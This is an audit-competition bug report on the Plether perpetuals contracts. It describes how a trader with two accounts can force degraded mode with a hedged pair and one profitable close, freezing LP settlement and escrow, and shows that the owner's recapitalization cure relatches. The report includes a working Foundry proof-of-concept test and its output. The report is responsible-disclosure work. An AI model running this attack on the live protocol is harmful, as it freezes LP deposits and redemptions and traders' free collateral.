# \#99808 [SC-High] Any trader can force engine degraded mode with a hedged pair and one profitable close, freezing LP epoch settlement and matured LP escrow; the owner's recap-and-clear cure does not hold

**Submitted on Nov 15th 2026 at 11:22:13 UTC by @sh15h4nk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99808
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A trader with two accounts can latch `CfdEngine.degradedMode` whenever they choose. The setup is an equal LONG and SHORT sized at the open-admission floor, followed by a full close of whichever leg is winning after an ordinary basket move of about 0.85%. The winning leg's profit is paid in cash from the pool. The losing leg's matching loss is not credited, even though it is fully backed by that account's own margin. Its maximum-profit envelope still sets `L`, so physical `E` drops below `L` and the engine latches.

While the latch is set, `HousePool.settleLpEpoch` reverts. No LP deposit activates and no redemption is funded. Matured Junior and Senior deposits and started redemptions can be neither settled nor cancelled.

No permissionless action ends the latch. It lasts until the owner recapitalizes and calls `clearDegradedMode`. That cure does not hold either. If the winning exposure is split across several accounts, each later close relatches with no new price move, even after the owner has recapitalized to the full buffer `E ≥ L + B`.

## Vulnerability Details

Definitions (`SECURITY.md:339-340`): `E = max(pool.totalAssets() − totalTraderClaims, 0)`, `L = max(longMaxProfit, shortMaxProfit)`, `B = ceil(L · settlementBufferBps / 10_000)` (25 bps at release).

**1. Admission checks a hedged pair against one side only.** Opens and increases require post-op `E ≥ L + B`. Per lot, the envelope is `p` for a LONG and `CAP − p` for a SHORT. At `p ≈ 1` (CAP = 2), an equal-size pair has equal envelopes, so `L` is the envelope of either leg alone. The pair uses the headroom of only one side.

**2. A close pays its profit in cash, reserved only behind existing trader claims, not behind `L`** (`CfdEnginePlanLib.sol:953-967`):
```solidity
uint256 freePoolCashAssets =
    CashPriorityLib.reserveFreshPayouts(poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets).freeCashAssets;
if (delta.pricePayoutAssets > 0) {
    delta.pricePayoutIsImmediate = freePoolCashAssets >= delta.pricePayoutAssets;
```
Closing the winner removes its own envelope, but `L` is still set by the losing leg's equal envelope. `E` falls by the payout and `L` does not move.

**3. The latch counts physical cash only.** `_enterDegradedModeIfInsolvent` (`CfdEngine.sol:1351-1369`) compares `_availableCashForFreshPoolPayouts()` against `L`. That function is `pool.totalAssets()` minus trader claims (`CfdEngine.sol:865-871`), and `totalAssets()` is the pool's USDG balance (`HousePool.sol:426-429`):
```solidity
uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
...
if (effectiveAssetsAfter < maxLiabilityAssets) {
    degradedMode = true;
```
The losing leg's marked loss equals the payout just made. It is fully collectible from that account's posted margin, but the check does not count it. In the PoC, `E` ends 7,109 USDG below `L`, while the losing leg holds about 90k USDG of marked loss backed by 300k USDG of its own margin. The book is economically covered, but the latch fires.

The latch fires once the net payout exceeds `E − L ≈ B·L`. Allowing for the close's skew VPI charge (`CloseAccountingLib.sol:103-117`) and the 4 bps execution fee, the measured threshold is a basket move of **0.85% in either direction**. The attacker closes whichever leg is winning.

**4. While latched, all LP settlement reverts.** `settleLpEpoch` → `_settleLpEpoch` → `_requireWithdrawalsLive` (`HousePool.sol:832`, `:1864-1869`) reverts `HousePool__DegradedMode`. Deposits stop as well as redemptions.

**5. Matured LP escrow cannot be recovered.**
- `TrancheVault.cancelPendingDeposit` (`TrancheVault.sol:851-859`) reverts `SeniorDepositCommitted` for Senior deposits. For Junior deposits whose epoch has started, it reverts `DepositEpochAlreadyActive`.
- `cancelRedeemRequest` (`TrancheVault.sol:894-896`) reverts once `currentLpEpoch() >= requestId`.

The deposited USDG and the escrowed shares stay locked for as long as the latch holds.

**6. Nothing permissionless refills `E`.**
- The attacker posts 3% margin on the losing leg (release initial margin is 0.2%, maintenance 0.1%), so that leg cannot be liquidated.
- New opens are rejected while degraded (`CfdEnginePlanLib.sol:318-320`), and deposits cannot activate (step 4), so no new capital can enter.
- `clearDegradedMode` is `onlyOwner` (`CfdEngine.sol:658-667`). Even after the attacker unwinds the losing leg and `E ≥ L` returns, the latch stays until the owner acts.

**7. The documented cure does not hold.** The runbook says: recapitalize, then clear once raw `E ≥ L` is restored, with no need to restore the buffer (`SECURITY.md:1506-1510`, `EMERGENCY_RESPONSE_GUIDE.md:45-48`).

Suppose the attacker splits the winning exposure across N accounts, each paired against the same losing short. The first close latches. The owner recapitalizes to the full buffer `E ≥ L + B`, which is more than the runbook requires, and clears. The next account's close latches again with no new price move. The PoC shows three latches in a row after one 2% move, each following a full-buffer recap (55,690, 50,238 and 39,412 USDG of owner capital). One bounded owner action does not fix the problem. The owner must keep up with every close the attacker still has queued.



## Impact Details

- **Matured LP escrow frozen.** In the PoC this is a 100,000 USDG Junior deposit, a 100,000 USDG Senior deposit and a 202,076 USDG Junior redemption request. These funds can be neither settled nor cancelled while the latch holds. The PoC observes the freeze across 2 hourly epochs, so the freeze lasts at least 1 hour. The latch has no permissionless end. Per the program's Operating Assumptions, "no detection or response deadline is assumed". The Guardian's settlement hold would unlock Senior deposit cancellation only (`TrancheVault.sol:852`). Junior deposits and redemptions stay locked.
- **Free collateral of positioned traders frozen.** Any account with an open position, including traders not involved in the attack, cannot withdraw free collateral while degraded (`CfdEngineSettlementSidecar.sol:274-276`).
- **LP epoch settlement halted for the whole pool.** No deposit activates and no redemption is funded. The control test shows the same utilization state settles normally without the latch, so the latch causes the freeze.

**Attacker cost** (release parameters, 10M USDG pool): about 400k USDG of working margin. The net cost of a full episode, including VPI, fees and the unwind, is 80,013 USDG. The attacker makes no profit, so this is griefing with a frozen-escrow to cost ratio of about 5:1. Immunefi's griefing downgrade applies only to High and Critical. This report claims Medium, "Temporary freezing of funds for at least 1 hour", which the PoC meets.


## References
- `packages/perps/src/CfdEngine.sol:1351-1369` (`_enterDegradedModeIfInsolvent`), `:865-871` (`_availableCashForFreshPoolPayouts`), `:658-667` (`clearDegradedMode`, `onlyOwner`), `:632-656` (`recapitalizePool`)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:953-967` (payout reserved only behind claims), `:318-320` (opens blocked while degraded)
- `packages/perps/src/libraries/CloseAccountingLib.sol:103-117` (VPI charged on close)
- `packages/perps/src/HousePool.sol:426-429` (`totalAssets`), `:832`, `:1864-1869` (settlement gate)
- `packages/perps/src/TrancheVault.sol:851-859`, `:894-896` (cancel gates)
- `packages/perps/src/CfdEngineSettlementSidecar.sol:274-276` (withdrawal gate for positioned accounts)
- `packages/perps/SECURITY.md:27`, `:339-340`, `:942`, `:1506-1510`; `packages/perps/EMERGENCY_RESPONSE_GUIDE.md:45-48`


## Proof of Concept

## Proof of Concept

1. `test_ForcedLatchFreezesLpSettlementAndEscrow`
   - Victim LPs make a 100k Junior deposit, a 100k Senior deposit and a full Junior redemption request while the system is healthy.
   - The attacker opens the hedged pair at the admission floor. The basket moves 0.9%, and the attacker fully closes the winning LONG. `E < L` and `degradedMode` latches.
   - For 2 hourly epochs, a third party's `settleLpEpoch` reverts `HousePool__DegradedMode`, and the over-margined losing leg cannot be liquidated.
   - All three escrow cancellations revert, and `clearDegradedMode` reverts `CfdEngine__StillInsolvent`.
   - After the attacker unwinds the losing leg, the latch is still set.
2. `test_RelatchAfterOwnerRecapToFullBuffer`
   - The winner is split across three accounts, with one 2% move.
   - Each close relatches even though the owner recapitalizes to `E ≥ L + B` and clears after every latch. The test asserts 3 latches.
3. `test_Control_SameStateWithoutLatchSettles`
   - The same utilization state without the latch: a 500k deposit activates on the next settlement pass.


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC for H-1: an untrusted trader with two accounts latches `CfdEngine.degradedMode` on a solvent book using a
// hedged LONG/SHORT pair and one profitable close. While latched, LP epoch settlement reverts and matured LP escrow
// can be neither settled nor cancelled. Only the owner can cure, and the documented cure (recap to E >= L + B)
// relatches. Release risk parameters (packages/perps/DEPLOYMENT.md). Production entry points only.
//
//   forge test --root packages/perps --match-path test/poc/H1ForcedDegradedMode.t.sol -vv

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

contract H1ForcedDegradedModePoC is BasePerpTest {

    address internal attackerLong = address(0xA11CE); // winner leg
    address internal attackerShort = address(0xB0B); // over-margined loser leg
    address internal keeper = address(0xEEEE);
    address internal lpJunior = address(0x1001);
    address internal lpSenior = address(0x1002);
    address internal lpRedeemer = address(0x1003);

    uint256 internal constant FUNDING = 400_000e6;
    uint256 internal constant LONG_MARGIN_BPS = 100;
    uint256 internal constant SHORT_MARGIN_BPS = 300;
    uint256 internal constant CHUNK = 3_000_000e18; // below the 40% skew cap
    uint256 internal constant QUANTUM = 1e20;

    // Release parameters (DEPLOYMENT.md).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 6_000_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 4_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(lpRedeemer, 200_000e6);
        vm.warp(vm.getBlockTimestamp() + 2 days); // deposit cooldown
        // Monday 10:00 UTC, outside weekend / FAD windows.
        vm.warp(SETUP_TIMESTAMP + ((block.timestamp - SETUP_TIMESTAMP) / 1 weeks + 1) * 1 weeks);
        router.updateMarkPrice(_px(1e8));
        _fundTrader(attackerLong, FUNDING);
        _fundTrader(attackerShort, FUNDING);
    }

    // ------------------------------------------------------------------ helpers

    function _E() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _px(
        uint256 price
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 t = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(int256(price)), 0, int32(-8), t, t - 1);
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _exec(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        vm.prank(trader);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory data = _px(price);
        vm.prank(keeper);
        router.executeOrder(id, data);
    }

    /// @dev Opens `size` on `longTrader`, paired with an equal SHORT on attackerShort, in chunks under the cap.
    function _openPaired(
        address longTrader,
        uint256 size
    ) internal {
        uint256 done;
        while (done < size) {
            uint256 step = size - done > CHUNK ? CHUNK : size - done;
            uint256 notional = step / 1e12; // price 1.00
            _exec(longTrader, CfdTypes.Side.LONG, step, (notional * LONG_MARGIN_BPS) / 10_000, false, 1e8);
            _exec(attackerShort, CfdTypes.Side.SHORT, step, (notional * SHORT_MARGIN_BPS) / 10_000, false, 1e8);
            done += step;
        }
    }

    /// @dev Hedge size leaving E about 5 bps above L*(1 + 25 bps buffer): the open-admission floor.
    function _hedgeTarget() internal view returns (uint256) {
        return ((_E() * 1e12 * 10_000) / 10_030 / QUANTUM) * QUANTUM;
    }

    function _ownerRecapToFullBufferAndClear() internal returns (uint256 recap) {
        uint256 l = _maxLiability();
        uint256 b = (l * engine.settlementBufferBps() + 9999) / 10_000;
        uint256 e = _E();
        recap = l + b > e ? l + b - e : 0;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        vm.prank(address(juniorVault));
        pool.reconcile();
        engine.clearDegradedMode();
        assertGe(_E(), _maxLiability() + b, "owner restored E >= L + B");
    }

    // ------------------------------------------------------------------ tests

    /// @notice One winner close after a 0.9% basket move latches degraded mode on a solvent book: LP settlement
    ///         reverts and matured LP escrow can be neither settled nor cancelled; nothing permissionless cures it.
    function test_ForcedLatchFreezesLpSettlementAndEscrow() public {
        // Victim LP requests, made while the system is healthy.
        settlementToken.mint(lpJunior, 100_000e6);
        vm.startPrank(lpJunior);
        settlementToken.approve(address(juniorVault), 100_000e6);
        uint256 jDep = juniorVault.requestDeposit(100_000e6, lpJunior, lpJunior);
        vm.stopPrank();
        settlementToken.mint(lpSenior, 100_000e6);
        vm.startPrank(lpSenior);
        settlementToken.approve(address(seniorVault), 100_000e6);
        uint256 sDep = seniorVault.requestDeposit(100_000e6, lpSenior, lpSenior);
        vm.stopPrank();
        uint256 rShares = juniorVault.balanceOf(lpRedeemer);
        vm.prank(lpRedeemer);
        uint256 rId = juniorVault.requestRedeem(rShares, lpRedeemer, lpRedeemer);

        uint256 attackerWealth0 = clearinghouse.balanceAssets(attackerLong) + clearinghouse.balanceAssets(attackerShort);

        // 1. Hedged pair at the admission floor.
        uint256 n = _hedgeTarget();
        _openPaired(attackerLong, n);
        assertFalse(engine.degradedMode());

        // 2. Basket falls 0.9%; attacker fully closes the winning LONG.
        uint256 p = 0.991e8;
        _exec(attackerLong, CfdTypes.Side.LONG, n, 0, true, p);
        assertEq(_size(attackerLong), 0);
        uint256 e = _E();
        uint256 l = _maxLiability();
        console2.log("E after close (USDG):", e / 1e6);
        console2.log("L after close (USDG):", l / 1e6);
        assertLt(e, l);
        assertTrue(engine.degradedMode(), "single winner close latches degraded mode");

        // 3. Freeze, observed hourly for 2 hours by third parties.
        uint256 latchedAt = vm.getBlockTimestamp();
        for (uint256 h; h < 2; ++h) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            bytes[] memory d = _px(p);
            vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
            router.settleLpEpoch(d);
            // The loser leg is over-margined: liquidation cannot refill E.
            vm.prank(address(0xDEAD));
            try router.executeLiquidation(attackerShort, _px(p)) {} catch {}
            assertGt(_size(attackerShort), 0, "loser leg not liquidatable");
        }
        assertGe(vm.getBlockTimestamp() - latchedAt, 2 hours);
        assertTrue(engine.degradedMode(), "still degraded");

        // Matured LP escrow cannot be recovered either.
        vm.prank(lpJunior);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(jDep);
        vm.prank(lpSenior);
        vm.expectRevert(TrancheVault.TrancheVault__SeniorDepositCommitted.selector);
        seniorVault.cancelPendingDeposit(sDep);
        vm.prank(lpRedeemer);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(rId, lpRedeemer);

        // Only the owner can cure: the clear is rejected until a recap restores E >= L.
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // Attacker unwinds the loser: the latch still does not lift without the owner.
        _exec(attackerShort, CfdTypes.Side.SHORT, n, 0, true, p);
        assertTrue(engine.degradedMode(), "latch outlives the attacker's position");

        uint256 attackerWealth1 = clearinghouse.balanceAssets(attackerLong) + clearinghouse.balanceAssets(attackerShort)
            + settlementToken.balanceOf(keeper);
        console2.log("victim escrow frozen: 100k J deposit + 100k S deposit (USDG)");
        console2.log("victim redeem request value (USDG):", juniorVault.convertToAssets(rShares) / 1e6);
        console2.log("attacker net cost, incl. full unwind (USDG):", (attackerWealth0 - attackerWealth1) / 1e6);
    }

    /// @notice The documented cure does not hold: with the winner split across three accounts and one 2% move, each
    ///         close relatches even though the owner recapitalizes to E >= L + B after every latch. No new move.
    function test_RelatchAfterOwnerRecapToFullBuffer() public {
        address[3] memory longs = [attackerLong, address(0xA11CE2), address(0xA11CE3)];
        _fundTrader(longs[1], FUNDING);
        _fundTrader(longs[2], FUNDING);
        uint256 part = ((_hedgeTarget() / 3) / QUANTUM) * QUANTUM;
        for (uint256 i; i < 3; ++i) {
            _openPaired(longs[i], part);
        }

        uint256 p = 0.98e8; // one move; price is constant afterwards
        uint256 latches;
        for (uint256 i; i < 3; ++i) {
            _exec(longs[i], CfdTypes.Side.LONG, part, 0, true, p);
            if (engine.degradedMode()) {
                ++latches;
                uint256 r = _ownerRecapToFullBufferAndClear();
                console2.log("latch; owner recap to E >= L + B (USDG):", r / 1e6);
            }
        }
        assertEq(latches, 3, "every close relatches after a full-buffer owner cure");
    }

    /// @notice Control: in the same utilization state without the latch, LP epochs settle and a new deposit
    ///         activates. Confirms the latch, not ordinary utilization, causes the freeze.
    function test_Control_SameStateWithoutLatchSettles() public {
        _openPaired(attackerLong, _hedgeTarget());
        assertFalse(engine.degradedMode());
        settlementToken.mint(lpJunior, 500_000e6);
        vm.startPrank(lpJunior);
        settlementToken.approve(address(juniorVault), 500_000e6);
        uint256 jDep = juniorVault.requestDeposit(500_000e6, lpJunior, lpJunior);
        vm.stopPrank();

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        router.settleLpEpoch(_px(1e8));
        assertEq(juniorVault.claimableDepositRequest(jDep, lpJunior), 500_000e6, "deposit activates without the latch");
    }

}

```

Output:
```bash
[PASS] test_Control_SameStateWithoutLatchSettles() (gas: 26447989)
[PASS] test_ForcedLatchFreezesLpSettlementAndEscrow() (gas: 35025046)
Logs:
  E after close (USDG): 10164291
  L after close (USDG): 10171400
  victim escrow frozen: 100k J deposit + 100k S deposit (USDG)
  victim redeem request value (USDG): 202076
  attacker net cost, incl. full unwind (USDG): 80013

[PASS] test_RelatchAfterOwnerRecapToFullBuffer() (gas: 47286155)
Logs:
  latch; owner recap to E >= L + B (USDG): 55690
  latch; owner recap to E >= L + B (USDG): 50238
  latch; owner recap to E >= L + B (USDG): 39412

Suite result: ok. 3 passed; 0 failed; 0 skipped
```

